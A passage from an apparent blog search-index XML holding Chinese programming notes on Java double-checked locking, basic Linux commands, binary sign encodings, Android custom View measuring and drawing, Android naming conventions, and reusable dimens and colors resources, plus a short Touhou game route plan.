并不是简单加个sychronized就完事了，注意两个if语句，这叫双重检查锁。当多个线程同时进入第一个if语句的时候。因为同步锁，所以肯定只有线程Ⅰ（不按先后排序）进去执行④。当线程Ⅰ退出同步锁且还没执行⑤的时候，线程Ⅱ进入同步块，因为已经有实例对象了，所以线程Ⅱ执行③为false，直接退出同步锁。 JVM指令重排序带来的弊端(2017/5/31更新) 参考资料:Double Checked Locking is Broken如何正确地写出单例模式 在上面代码中的instance = new A();这条代码做了三件事。 给 A 分配内存 调用 A 的构造函数来初始化成员变量 将instance对象指向分配的内存空间（执行完这步 instance 就为非 null 了） Java指令重排序会打乱这一执行顺序，造成132或者123的执行顺序，如果线程一执行了13，这时候instance不为null，这时候线程二使用instance就会出错。 解决方案： 在jdk5之后，Java使用了新的内存模型，使用volatile修饰instance，禁止指令重排序。 饿汉式解决，使用static final field修饰instance。]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux命令提示符]]></title>
    <url>%2Fposts%2FLinux_command.html</url>
    <content type="text"><![CDATA[命令提示符用户及主机名:[root@localhost ~]1[root@localhost ~]# root：当前登录用户localhost：主机名~：/root#：超级用户$：普通用户 查询目录中的内容：lslist的缩写12345ls -a //显示全部文件，包括隐藏文件ls -d //查看目录属性ls -l //查询详细信息，ls -l可缩写为llls -h //显示为人们容易看的格式ls -i //显示inode，节点号 建立目录：mkdirmake directories的缩写-p：递归创建1mkdir -p dir1/dir2 //创建dir1目录，并在dir之下创建dir2目录 切换目录：cdchange directory的缩写按两次tab可以补全命令12345cd ~ //进入当前用户的家目录cd //进入当前用户的家目录cd - //进入上次目录cd .. //进入上一级目录(相对路径使用)cd . //进入当前目录(相对路径使用) 查询所在目录位置：pwdprint working directory的缩写1pwd //显示当前所在位置 删除文件或目录：rmdir和rmrm是remove的缩写，常用rmdir是remove empty directories的缩写，比rm更严格，只能删除空目录。1rm -rf [文件] //-r删除目录，-f强制删除 复制命令：cpcopy的缩写1234cp -r [原文件][新文件] //-r复制目录cp -p [原文件][新文件] //-p连属性一起复制cp -d [原文件][新文件] //-d若源文件是链接文件，则复制链接属性cp -a [原文件][新文件] //-a上面三个一起选中，即-pdr 剪切或改名命令：mvmove的缩写，在相同目录下为改名，不同目录为剪切1mv [原文件名] [新文件名] 链接命令：lnlink的缩写，生成链接文件硬链接可以看成复制，拥有相同的i节点和存储block块，不能跨分区，不能针对目录使用。删除原文件对硬链接文件没影响。软链接可以看成快捷方式，拥有自己的i节点和存储block块，block块中存储原文件的i节点和文件名删除原文件对软链接文件有影响。软链接文件权限固定为lrwxrwxrwx，真实权限要看原文件，创建软链接文件要写绝对路径。1link -s [原文件][目标文件] //-s创建软链接(soft) 搜索命令：locate，find，whereis，whoami，whatis，which，greplocate搜索速度快，在后台数据库/var/lib/mlocate中按文件名搜索，只能按照文件名搜索find进行精确查询，要模糊查询使用*通配符whoami搜索当前用户whatis搜索命令的作用whereis只能搜索系统命令的所在位置，搜索命令的所在位置和帮助文档which搜索命令所在位置和别名1234567891011121314151617locate[文件名] //创建新文件后，必须要updatedb更新数据库，才能找到新文件find [位置] -name [文件名]find [位置] -iname [文件名] //不区分大小写find [位置] -user [文件名] //按照所有者搜索find [位置] -nouser [文件名] //查找没有所有者的文件find [位置] -mtime +10 //查找10天前修改内容的文件，+10十天前，10十天当天，-10十天内find [位置] -ctime +10 //查找10天前修改属性的文件find [位置] -atime +10 //查找10天前访问过的文件find [位置] -size 25k //查找大小为25KB的文件，+25大于25KB，25等于25KB，-25小于25KB，k小写，M大写find [位置] -size +25k -a -size -100k //查找大于25k小于100k的文件，-a逻辑与，-o逻辑或find [位置] -size +25k -a -size -100k -exec [命令] &#123;&#125; \ //对满足条件的文件执行命令find [位置] -inum 123456 //查找i节点为123456的文件whoamiwhatis [命令]whereis -bm[命令] -b只查找可执行文件，-m只查找帮助文档which [命令]grep -iv [字符串] [文件名] //在文件当中匹配符合的字符串，匹配使用正则表达式，-i忽略大小写，-v排除指定字符串(取反) 根据/etc/updatedb.conf配置文件进行搜索 prune_bind_mounts=”yes” 开启搜索限制 prunefs 搜索时，不搜索的文件系统 prunenames 搜索时，不搜索的文件类型（后缀） prunepaths 搜索时，不搜索的文件路径 帮助命令：man，help，infomanul的缩写12345man -f [命令] //相当于whatis，查看命令的作用man -k [命令] //相当于apropos，查看命令的所有帮助ls --help //命令的帮助help [命令] //help是专门获取shell内部命令的帮助命令info [命令] //-回车进入子帮助页面，-u进入上层页面，-n进入下一个帮助小节，-p进入上一个帮助小节，-q退出 压缩命令：zip，unzip，gzip，gunzip，bzip2，bunzip2，tar常见压缩格式：.zip，.gz，.bz2，.tar.gz，.tar.bz21234567891011121314151617181920zip [压缩文件名] [原文件] //-r压缩目录unzip [压缩文件] //解压缩gzip [原文件] //自动压缩生成源文件.gz，并且删除原文件gzip -r [原文件] //-r压缩目录下的所有子文件，但不压缩目录gzip -c [原文件] &gt; [压缩文件] //压缩文件，但不删除原文件gzip -d [压缩文件] //解压缩gunzip [压缩文件] //解压缩bzip2 -k [原文件] //-k保留原文件，不能压缩目录bzip2 -d [压缩文件] //-k保留压缩文件，解压缩bunzip2 [压缩文件] //解压缩tar -cvf [压缩文件] [原文件] //-c打包，-v显示过程，-f指定打包后的文件名，解决不能压缩目录的问题tar -xvf [压缩文件] //-x解打包，-v显示过程，-f指定打包后的文件名tar -zcvf [压缩文件] [原文件1] [原文件2] //-z压缩gz格式，可以压缩多个文件tar -jcvf [压缩文件] [原文件1] [原文件2] //-j压缩bz2格式，可以压缩多个文件tar -zxvf [压缩文件] //-x解压缩tar -jxvf [压缩文件] -c [新文件名] //-x解压缩，并重命名tar -ztvf [压缩文件] -c [新文件名] //-t查看压缩内容，不解压 关机和重启命令：shutdown，halt，poweroff，init 0halt，poweroff，init 0关机不安全，不能保存数据reboot，init 6重启不安全1234shutdown -c //-c取消前一个关机命令shutdown -h [时间] shutdown -h now //-h关机，现在关机shutdown -r 05:30 &amp; //-r重启，&amp;放入后台，凌晨5点30分重启 init相关命令 退出登录命令：logout1logout 挂载与卸载命令：mount，umount12345mount //查询挂载点mount -a //根据/etc/fstab的内容，自动挂载mount -t [文件系统] -o [特殊选项] [设备文件名] [挂载点] //进行挂载umount [设备文件名或挂载点] //卸载命令 -o特殊选项 挂载光盘12mkdir /mnt/cdrom //先建立挂载点mount -t iso9660 /dev/sr0 /mnt/cdrom //然后进行挂载 挂载U盘123fdisk -l //查看U盘设备名mkdir /mnt/usb //先建立挂载点mount -t vfat /dev/sdb1 /mnt/usb //进行挂载]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[东方STG规划]]></title>
    <url>%2Fposts%2FTouhou_project_game_plan.html</url>
    <content type="text"><![CDATA[东方风神录风神的神德蓝绿 中间往右青红 中间往右紫蓝 中间往左蓝绿 左边往左上穿 东方星莲船12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152一面：红彩（红蓝绿）红绿2绿碎片二面：绿（1碎片）绿绿红（炸）红1红碎片三面：红（1碎片）绿绿红（炸）绿1绿碎片四面：绿（1绿碎片）彩（绿红蓝）绿红（蓝左红右）蓝绿（炸折返）红（炸）绿（炸）绿（炸）2绿碎片五面：绿（2绿碎片，炸）绿绿（炸？）绿绿红蓝1绿碎片六面：绿（1碎片）（炸）绿绿红蓝绿]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>东方project</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据单位]]></title>
    <url>%2Fposts%2Fdata_unit.html</url>
    <content type="text"><![CDATA[数据单位位（bit）来自英文bit，音译为“比特”，表示二进制位。位是计算机内部数据储存的最小单位，11010100是一个8位二进制数。一个二进制位只可以表示0和1两种状态。两个二进制位可以表示00、01、10、11四种状态。N个二进制位可以表示$2^N$种状态 字节（byte）字节来自英文Byte，音译为“拜特”，习惯上用大写的B表示。字节是计算机中数据处理的基本单位。计算机中以字节为单位存储和解释信息，规定一个字节由八个二进制位构成。即1个字节等于8个比特（1Byte=8bit）。八位二进制数最小为00000000，最大为11111111。通常1个字节可以存入一个ASCII码，2个字节可以存放一个汉字国标码。 字计算机进行数据处理时，一次存取、加工和传送的数据长度称为字（word）。一个字通常由一个或多个（一般是字节的整数位）字节构成。例如286微机的字由2个字节组成，它的字长为16位机；486微机的字由4个字节组成，它的字长为32位机。计算机的字长决定了其CPU一次操作处理实际位数的多少，由此可见计算机的字长越大，其性能越优越。]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown语法之如何使用LaTeX语法编写数学公式]]></title>
    <url>%2Fposts%2Fhow_to_write_LaTeX_in_Markdown.html</url>
    <content type="text"><![CDATA[教程 在线生成图片的网站: latex.codecogs.com]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制的原码，反码，补码，移码之间的相互转换]]></title>
    <url>%2Fposts%2Ftrue_code%2C_ones-complement_code%2C_complemental_code%2C_shift_code.html</url>
    <content type="text"><![CDATA[二进制最高位为符号位，0为正数，1为负数。正数的原码和反码和补码一致。负数的反码 = 原码除了最高位（符号位）全部取反。负数的补码 = 反码+1。 移码 = 补码的最高位（符号位）取反。 -0原码:1000 0000-0反码:1111 1111-0补码:0000 0000-0移码:1000 0000 +0原码:0000 0000+0反码:0000 0000(正数反码和原码相同)+0补码:0000 0000(正数补码和原码相同)+0移码:1000 0000 -1原码:1000 0001-1反码:1111 1110-1补码:1111 1111-1移码:0111 1111 +1原码:0000 0001+1反码:0000 0001(正数反码和原码相同)+1补码:0000 0001(正数补码和原码相同)+1移码:1000 0001]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[getWidth()、getHeight()方法返回的值为0]]></title>
    <url>%2Fposts%2FgetWidth()%E3%80%81getHeight()_method_alway_return_zero.html</url>
    <content type="text"><![CDATA[前言在自定义View的构造方法中使用getWidth()和getHeight()返回值为0，因为过早的使用了这些方法，也就是说在这个view被加入到rootview之前你就调用了这些方法，返回的值自然为0。 解决方法：自定义View实现OnGlobalLayoutListener接口，并重写onGlobalLayout方法1234567891011121314151617181920212223@Overrideprotected void onAttachedToWindow() &#123; super.onAttachedToWindow(); getViewTreeObserver().addOnGlobalLayoutListener(this); //在自定义View添加到窗体上时,添加onGlobalLayoutListener&#125;@Overrideprotected void onDetachedFromWindow() &#123; super.onDetachedFromWindow(); getViewTreeObserver().removeOnGlobalLayoutListener(this); //在自定义View从窗体移除时,移除onGlobalLayoutListener&#125;@Overridepublic void onGlobalLayout() &#123; //重写onGlobalLayoutListener中的onGlobalLayout方法 Log.i(TAG, "onGlobalLayout"); if(!mCreated)&#123;//设置只执行一次 mCreated = true //这里getWidth(),getHeight()不为0 &#125;&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>自定义View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义一个简单的TextView]]></title>
    <url>%2Fposts%2Fcustom_a_simple_TextView.html</url>
    <content type="text"><![CDATA[定义、使用属性首先在res/values/attrs.xml文件夹（没有的话自己创建一个）中设置好自定义的属性。注意，因为Toolbar中已经有了titleTextColor的属性，如果我们进行声明，则会编译不通过。所以这里进行了引用，也就是不写format。属性有： 值 含义 值 含义 string 字符串 color 颜色 demension 尺寸 integer 整型 enum 枚举 reference 引用 float 浮点 boolean 布尔 fraction 百分数 flag 位或运算 12345678&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;resources&gt; &lt;declare-styleable name="CustomTitleView"&gt; &lt;attr name="titleText" format="string"/&gt; &lt;attr name="titleTextSize" format="dimension"/&gt; &lt;attr name="titleTextColor"/&gt; &lt;/declare-styleable&gt;&lt;/resources&gt; 在代码中获取属性值自定义了属性之后，当然是在构造方法中获取属性值。1234567891011121314151617181920212223242526272829303132333435363738public class CustomTitleView extends View implements View.OnClickListener&#123; private String titleText; private int titleTextColor; private int titleTextSize; private Rect rect; private Paint paint; public CustomTitleView(Context context) &#123;this(context, null);&#125;//调用自身构造方法 public CustomTitleView(Context context, AttributeSet attrs) &#123;this(context, attrs, 0);&#125;//调用自身构造方法 public CustomTitleView(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr); //获取所有的属性 TypedArray ta = context.obtainStyledAttributes(attrs, R.styleable.CustomTitleView, defStyleAttr, 0); int n = ta.getIndexCount(); for(int i = 0; i &lt; n; i++)&#123; int attr = ta.getIndex(i); switch(attr)&#123; case R.styleable.CustomTitleView_titleText: titleText = ta.getString(attr); break; case R.styleable.CustomTitleView_titleTextColor: titleTextColor = ta.getColor(attr, Color.BLACK); break; case R.styleable.CustomTitleView_titleTextSize: //这里将获取的数值单位转换为sp单位 titleTextSize = ta.getDimensionPixelSize(attr, (int) TypedValue.applyDimension( TypedValue.COMPLEX_UNIT_SP, 15, getResources().getDisplayMetrics())); break; &#125; &#125; ta.recycle(); //设置画笔 paint = new Paint(); paint.setTextSize(titleTextSize); //Rect是文字所在的矩形，用于测量View的大小 rect = new Rect(); paint.getTextBounds(titleText, 0, titleText.length(), rect); &#125;&#125; 重写onMeasure方法重写onMeasure方法，否则的话不支持wrap_content1234567891011121314151617181920212223@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; //这里是必须的,当titleText改变时,rect也必须改变,否则不会对titleText适配 paint.setTextSize(titleTextSize); paint.getTextBounds(titleText, 0, titleText.length(), rect); int widthMode = MeasureSpec.getMode(widthMeasureSpec);//获取测量模式 int widthSize = MeasureSpec.getSize(widthMeasureSpec);//获取测量大小 int width; if(widthMode == MeasureSpec.EXACTLY)&#123;//如果是固定100dp或match_parent width = widthSize; &#125; else &#123;如果是warp_content width = getPaddingLeft()+rect.width()+getPaddingRight();//注意要加上padding &#125; int heightMode = MeasureSpec.getMode(heightMeasureSpec);//同width int heightSize = MeasureSpec.getSize(heightMeasureSpec); int height; if(heightMode == MeasureSpec.EXACTLY)&#123; height = heightSize; &#125; else &#123; height = getPaddingTop()+rect.height()+getPaddingBottom(); &#125; setMeasuredDimension(width, height);//最后设置参数,super里面也是调用这个方法进行设置&#125; 进行绘制12345678@Overrideprotected void onDraw(Canvas canvas) &#123; paint.setColor(Color.YELLOW); canvas.drawRect(0, 0, getMeasuredWidth(), getMeasuredHeight(), paint);//绘制背景 paint.setColor(titleTextColor); canvas.drawText(titleText, getWidth()/2-rect.width()/2, getHeight()/2+rect.height()/2, paint);//绘制文字 //为什么width是减,height是加,要看API文档&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>自定义View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[View的onMeasure()]]></title>
    <url>%2Fposts%2FonMeasure_method_of_View.html</url>
    <content type="text"><![CDATA[自定义View首先需要测量View的大小自定义View首先需要测量View的大小，在View的onMeasure()方法中进行。View的大小分为三种类型，测量模式也有三种 自适应(wrap_content)，对应at_most(最大值模式)，代表的是最大可获得的空间 固定(100dp)，对应Exactly(精确值模式)，代表的是精确的尺寸； 填充父View(match_parent)，对应Exactly(精确值模式)，代表的是精确的尺寸； 还有个UnSpecified(未指定模式)，不指定View的大小，想多大就多大，用于scrollView等类。 默认情况onMeasure()只支持Exactly模式，所以要重写onMeasure方法.onMeasure传入的widthMeasureSpec和heightMeasureSpec不是一般的尺寸数值，而是将模式和尺寸组合在一起的数值。MeasureSpec是一个32位的int值，高2位为测量模式，低30位为测量的大小。查看View的onMeasure()源码发现，调用了setMeasuredDimension(int measuredWidth, int measuredHeight)方法。那么我们只要将设置好的长宽参数穿进去即可。1234567891011121314151617181920212223242526272829@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123;// super.onMeasure(widthMeasureSpec, heightMeasureSpec); Log.i("onMeasure","onMeasure"); setMeasuredDimension(measureWidth(widthMeasureSpec), measureHeight(heightMeasureSpec));// measureWidth()和measureHeight()源码基本一致&#125;private int measureWidth(int measureSpec) &#123; int result; int specMode = MeasureSpec.getMode(measureSpec);//获取测量模式 int specSize = MeasureSpec.getSize(measureSpec);//获取Size// Log.i("measureWidth","measureSpec:"+measureSpec); Log.i("measureWidth","specSize:"+specSize); if(specMode == MeasureSpec.EXACTLY)&#123; Log.i("measureWidth","specMode:"+"MeasureSpec.EXACTLY"); result = specSize;//如果是Exactly模式,则直接设置 &#125; else &#123; result = 200;//如果不是Exactly模式,设置最小的Size if(specMode == MeasureSpec.AT_MOST)&#123; Log.i("measureWidth","specMode:"+"MeasureSpec.AT_MOST"); result = Math.min(result, specSize); //这里需要自定义,对子`View`的Size进行测量 &#125; else if(specMode == MeasureSpec.UNSPECIFIED)&#123; Log.i("measureWidth","specMode:"+"MeasureSpec.UNSPECIFIED"); &#125; &#125; return result;&#125; onMeasure()触发了两次？打印log时出现这个问题，待解决]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>自定义View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android命名规范和编码规范]]></title>
    <url>%2Fposts%2FAndroid_naming_conventions_and_coding_specifications.html</url>
    <content type="text"><![CDATA[前言本文适用范围：已参加项目开发的人 写这篇文章的目的是为方便地对代码进行管理，让整个团队的代码规范化。这里的部分规定可能和你在其他地方看到的不一样，但还是请遵守这些规则。 编码规范是泯灭程序猿个性的一项制度，但对于整个团队而言，却是一件利器-《App 研发录》 统一代码格式首先请参照这篇文章设置 Android Studio 的 Code Style：设置 Code Style细心的同学可能会发现代码风格跟 Google 推荐的不一致，但请记住，我们是一个团队。 项目结构 命名规范控件 Id 命名方式命名模式：View 缩写_逻辑名称例如一个登陆按钮 Button：id 为 btn_login，私有成员变量 mBtnLogin View @Id ava variable（private） Button btn_ mBtnLogin TextView txt_ mTxtLogin ImageView img_ mImageLogin EditText edt_ mEdtContent Spinner spinner_ mSpinnerNation TabLayout tab_ mTabLayout LinearLayout linear_ mLinearLayout Layout 相关 Component Class Name Layout Name Activity UserProfileActivity activity_user_profile.xml Fragment SignUpFragment fragment_sign_up.xml Dialog ChangePasswordDialog dialog_change_password.xml AdapterView item - list_item_archive.xml Color 相关通常我们不直接使用数字来定义一些属性值，而是先将它定义在所对应的文件里，然后去引用它。 推荐从 Material Design 中 Color 中选取颜色(后详) 尽量以 “颜色名称_程度” 来命名 必要时也可用颜色功能来命名 在Material color palette 的网页中，可以看到官方设计文档的调色板，尽量从文档中选取颜色，来命名和使用。命名采用全小写，下划线分割的形式。1234567891011121314&lt;!-- color --&gt; &lt;color name="grey_xlight"&gt;# F5F5F5&lt;/color&gt; &lt;color name="grey_light"&gt;# E0E0E0&lt;/color&gt; &lt;color name="grey"&gt;# 9E9E9E&lt;/color&gt; &lt;color name="grey_dark"&gt;# 616161&lt;/color&gt; &lt;color name="grey_xdark"&gt;# 424242&lt;/color&gt; &lt;color name="title_normal"&gt;# FBE9E7&lt;/color&gt; &lt;color name="bg_pop&gt;# FF6D00&lt;/color&gt; &lt;!-- material color --&gt; &lt;color name="material_red_500"&gt;# F44336&lt;/color&gt; &lt;color name="material_purple_100"&gt;# E1BEE7&lt;/color&gt; &lt;color name="material_green_800"&gt;# 2E7D32&lt;/color&gt; 注意 Material color 的命名方式 Dimen 相关 尽量以 “逻辑名称_程度” 来命名 必要时也可用 “逻辑名称_功能” 来命名1234567891011121314151617181920&lt;!-- text size --&gt; &lt;dimen name="text_size_xxsmall"&gt;12sp&lt;/dimen&gt; &lt;dimen name="text_size_xsmall"&gt;14sp&lt;/dimen&gt; &lt;dimen name="text_size_small"&gt;16sp&lt;/dimen&gt; &lt;dimen name="text_size_medium"&gt;18sp&lt;/dimen&gt; &lt;dimen name="text_size_large"&gt;20sp&lt;/dimen&gt; &lt;dimen name="text_size_xlarge"&gt;22sp&lt;/dimen&gt; &lt;dimen name="text_size_title"&gt;18sp&lt;/dimen&gt; &lt;!-- typical spacing between two views, margin or padding --&gt; &lt;dimen name="spacing_tiny"&gt;4dp&lt;/dimen&gt; &lt;dimen name="spacing_small"&gt;10dp&lt;/dimen&gt; &lt;dimen name="spacing_medium"&gt;14dp&lt;/dimen&gt; &lt;dimen name="spacing_large"&gt;24dp&lt;/dimen&gt; &lt;dimen name="spacing_huge"&gt;40dp&lt;/dimen&gt; &lt;!-- typical sizes of views --&gt; &lt;dimen name="button_height_small"&gt;32dp&lt;/dimen&gt; &lt;dimen name="button_height_medium"&gt;40dp&lt;/dimen&gt; &lt;dimen name="button_height_large"&gt;60dp&lt;/dimen&gt; String 相关String 命名的前缀应该能够清楚地表达它的功能职责，若是某个模块的字符串，可以以这个模块的名字为前缀然后再加上它的含义，如，registratione_mail_hint，registration_name_hint。123&lt;string name="app_name"&gt;app名&lt;/string&gt;&lt;string name="registration_email_hint"&gt;请输入邮箱地址&lt;/string&gt;&lt;string name="registration_name_hint"&gt;请输入用户名&lt;/string&gt; 如果一个Sting不属于任何模块，这也就意味着它是通用的，应该遵循以下规范： type detail error_ 错误提示 success_ 正确提示 msg_ 一般信息提示 title_ 标题提示，如，Dialog 标题 action_ 动作提示，如，“保存”，“取消”，“创建” direct_ 页面跳转提示 其他通用字符串尽量以：类别_功能 或 含义 来命名 Drawable 相关当没有多种类型的图片时，图片统一放在 drawable-xxhdpi 的文件夹下 Asset Type Prefix Example Action bar ab_ ab_stacked.9.png Button btn_ btn_send_pressed.9.png Dialog dialog_ dialog_top.9.png Divider divider_ divider_horizontal.9.png Icon ic_ ic_star.png Menu menu_ menu_submenu_bg.9.png Notification notification_ notification_bg.9.png Tabs tab_ tab_pressed.9.png Android 编码规范XML 文件规范属性当你写好 layout 文件后，按 Ctrl + alt + L 格式化后，手动排版为下面这样的格式： 每行两个属性 android:id 作为第一个属性 如果存在 style 属性，则紧随作为第二行首个属性 如果不存在 style 属性，则 android:layout_xxx 紧随作为第二行首个属性 当布局中的一个元素不再包含子元素时，在最后一个属性右边使用自闭合标签/&gt; 123456789&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical"&gt; &lt;TextView android:id="@+id/txt_name" style="@style/FancyText" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_alignParentRight="true"/&gt;&lt;/LinearLayout&gt; 使用 Tools布局预览应使用 tools:相关属性，避免 android:text 等硬编码的出现 123&lt;TextView android:layout_width="wrap_content" android:layout_height="wrap_content" tools:text="Home Link"/&gt; Java 代码规范Field对Field的定义应该放在文件的首位，并且遵守以下规范： 被 private 修饰的非静态变量，以 m 作为前缀 被 private 修饰的静态变量，以 s 作为前缀 被 public 修饰的非静态变量，以小写首字母做前缀 其他变量，以 m 作为前缀，采用驼峰命名 静态常量命名字母全部大写，单词之间用下划线分隔1234567891011public class MyClass &#123; public static final int SOME_CONSTANT = 42; @Bind(R.id.edit_collection_name) EditText mEdtName; public int publicField; private static MyClass sSingleton; int mPackagePrivate; private int mPrivate; protected int mProtected;&#125; Entity对于继承 Entity 的 Model 类型，按照下图进行编码：注意变量修饰符和大小写 类成员排序关于这个并没有硬性要求，不过好的排序方式，能够提高可读性和易学性。这里给出一些排序建议： 常量 字段 构造函数 被重写的函数（不区分修饰符类型） 被private修饰的函数 被public修饰的函数 被定义的内部类或者接口如果继承了Android组件，比如Activity或者Fragment，重写生命周期函数时，应该按照组件的生命周期进行排序示例如下：123456789101112131415public class MainActivity extends Activity &#123; private static final String TAG = MainActivity.class.getSimpleName(); private String mTitle; private TextView mTextViewTitle; @Override public void onCreate() &#123; &#125; private void setUpView() &#123; &#125; public void setTitle(String title) &#123; mTitle = title; &#125; static class AnInnerClass &#123; &#125;&#125; 字符串常量的命名Android SDK 中诸如 SharedPreferences，Bundle 和 Intent 等，都采用 key-value 的方式进行赋值，当使用这些组件的时候，key 必须被 static final 所修饰，并且命名应该符合以下规范： ElementField Name Prefix SharedPreferences PREF_ Bundle BUNDLE_ Fragment Arguments ARGUMENT_ Intent Extra EXTRA_ Intent Action ACTION_ 示例如下：123456static final String PREF_EMAIL = "PREF_EMAIL";static final String BUNDLE_AGE = "BUNDLE_AGE";static final String ARGUMENT_USER_ID = "ARGUMENT_USER_ID"; static final String EXTRA_SURNAME = "com.myapp.extras.EXTRA_SURNAME";static final String ACTION_OPEN_USER = "com.myapp.action.ACTION_OPEN_USER"; Activity 与 Fragment 打开方式当通过 Intent 或者Bundle向Activity与Fragment传值时，应该遵循上面提到的key-value规范，公开一个被 public static 修饰的方法，方法的参数应该包含所有打开这个 Activity 或者 Fragment 的信息，示例如下： 通过 .startActivity() 函数，开启指定 Activity： 12345public static void startActivity(AppCompatActivity startingActivity, User user) &#123; Intent intent = new Intent(startingActivity, ThisActivity.class); intent.putParcelableExtra(EXTRA_USER, user); startingActivity.startActivity(intent);&#125; 通过 .newInstance() 函数，加载指定 Fragment： 1234567public static UserFragment newInstance(User user) &#123; UserFragment fragment = new UserFragment; Bundle args = new Bundle(); args.putParcelable(ARGUMENT_USER, user); fragment.setArguments(args) return fragment;&#125; 结语如果您所寻找的命名不在上述规范中，可以暂时使用自己的方式来命名，但也要有一定格式并在自己的程序中统一。通常我们会把更大的类别放在前，更细致的放在后。欢迎大家提出问题，互相探讨，共同维护出一份更好的更清晰的开发规范。 参考资料 [Android]命名规范和编码规范 Android编码规范 Android Development Guideline Android 命名规范 （提高代码可以读性）]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>编码规范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用配置文件]]></title>
    <url>%2Fposts%2FAndroid_common_xml.html</url>
    <content type="text"><![CDATA[dimens.xml经常需要使用到一些尺寸，这里就记录一下，方便拷贝。直接在values中的dimens.xml文件中粘贴即可使用方法，如：Android:TextSize=&quot;@dimens/offset_2dp&quot;123456789101112131415&lt;resources&gt; &lt;!-- text size --&gt; &lt;dimen name="font_size_tiny"&gt;10sp&lt;/dimen&gt; &lt;dimen name="font_size_small"&gt;12sp&lt;/dimen&gt; &lt;dimen name="font_size_normal"&gt;14sp&lt;/dimen&gt; &lt;dimen name="font_size_normal_high"&gt;16sp&lt;/dimen&gt; &lt;dimen name="font_size_large"&gt;18sp&lt;/dimen&gt; &lt;dimen name="font_size_large_high"&gt;20sp&lt;/dimen&gt; &lt;dimen name="font_size_xlarge"&gt;22sp&lt;/dimen&gt; &lt;!--边距--&gt; &lt;dimen name="offset_2dp"&gt;2dp&lt;/dimen&gt; &lt;dimen name="offset_4dp"&gt;4dp&lt;/dimen&gt; &lt;dimen name="offset_6dp"&gt;6dp&lt;/dimen&gt;&lt;/resources&gt; colors.xml经常需要使用到一些颜色，这里就记录一下，方便拷贝。直接在values中的colors.xml文件中粘贴即可使用方法，如：Android:background=&quot;@color/yellow&quot;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153&lt;!--values中的colors.xml文件--&gt; &lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;resources&gt; &lt;color name="colorPrimary"&gt;#3F51B5&lt;/color&gt; &lt;color name="colorPrimaryDark"&gt;#303F9F&lt;/color&gt; &lt;color name="colorAccent"&gt;#FF4081&lt;/color&gt; &lt;color name="white"&gt;#FFFFFF&lt;/color&gt;&lt;!--白色 --&gt; &lt;color name="ivory"&gt;#FFFFF0&lt;/color&gt;&lt;!--象牙色 --&gt; &lt;color name="lightyellow"&gt;#FFFFE0&lt;/color&gt;&lt;!--亮黄色--&gt; &lt;color name="yellow"&gt;#FFFF00&lt;/color&gt;&lt;!--黄色 --&gt; &lt;color name="snow"&gt;#FFFAFA&lt;/color&gt;&lt;!--雪白色 --&gt; &lt;color name="floralwhite"&gt;#FFFAF0&lt;/color&gt;&lt;!--花白色 --&gt; &lt;color name="lemonchiffon"&gt;#FFFACD&lt;/color&gt;&lt;!--柠檬绸色 --&gt; &lt;color name="cornsilk"&gt;#FFF8DC&lt;/color&gt;&lt;!--米绸色 --&gt; &lt;color name="seashell"&gt;#FFF5EE&lt;/color&gt;&lt;!--海贝色 --&gt; &lt;color name="lavenderblush"&gt;#FFF0F5&lt;/color&gt;&lt;!--淡紫红 --&gt; &lt;color name="papayawhip"&gt;#FFEFD5&lt;/color&gt;&lt;!--番木色 --&gt; &lt;color name="blanchedalmond"&gt;#FFEBCD&lt;/color&gt;&lt;!--白杏色 --&gt; &lt;color name="mistyrose"&gt;#FFE4E1&lt;/color&gt;&lt;!--浅玫瑰色 --&gt; &lt;color name="bisque"&gt;#FFE4C4&lt;/color&gt;&lt;!--桔黄色 --&gt; &lt;color name="moccasin"&gt;#FFE4B5&lt;/color&gt;&lt;!--鹿皮色 --&gt; &lt;color name="navajowhite"&gt;#FFDEAD&lt;/color&gt;&lt;!--纳瓦白 --&gt; &lt;color name="peachpuff"&gt;#FFDAB9&lt;/color&gt;&lt;!--桃色 --&gt; &lt;color name="gold"&gt;#FFD700&lt;/color&gt;&lt;!--金色 --&gt; &lt;color name="pink"&gt;#FFC0CB&lt;/color&gt;&lt;!--粉红色 --&gt; &lt;color name="lightpink"&gt;#FFB6C1&lt;/color&gt;&lt;!--亮粉红色--&gt; &lt;color name="orange"&gt;#FFA500&lt;/color&gt;&lt;!--橙色 --&gt; &lt;color 